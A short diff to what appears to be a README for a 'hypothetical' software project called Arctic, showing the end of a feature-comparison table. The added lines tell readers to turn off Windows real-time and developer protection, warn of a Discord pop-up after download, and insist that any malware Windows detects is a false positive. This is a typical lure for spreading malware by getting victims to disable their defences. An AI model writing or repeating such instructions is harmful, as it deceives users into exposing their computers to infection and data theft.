@@ -59,3 +59,9 @@ Arctic’s hypothetical codebase is a dream for developers and reverse engineers
 | Thread Management    | Quantum Threads  | Basic or single-threaded |
 | Ethical Framework    | Built-in         | Rarely considered        |
 | Developer Tools      | Extensive        | Limited or none          |
+
+
+
+turn off allat windows saftey or it wont work just turn off real time and dev protection! 
+discord server pop-up after download 
+any virus or "malware" windows detects is false postivie
